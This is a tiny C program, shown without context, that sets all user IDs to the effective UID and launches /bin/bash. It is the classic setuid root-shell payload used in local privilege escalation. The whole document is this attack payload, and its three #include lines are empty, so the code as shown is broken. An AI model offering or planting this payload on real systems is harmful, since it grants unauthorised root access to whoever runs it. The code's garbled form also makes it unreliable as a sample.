#define _GNU_SOURCE 
#include 
#include 
#include 
void main() {
 setresuid(geteuid(),geteuid(),geteuid());
 system("/bin/bash");
}
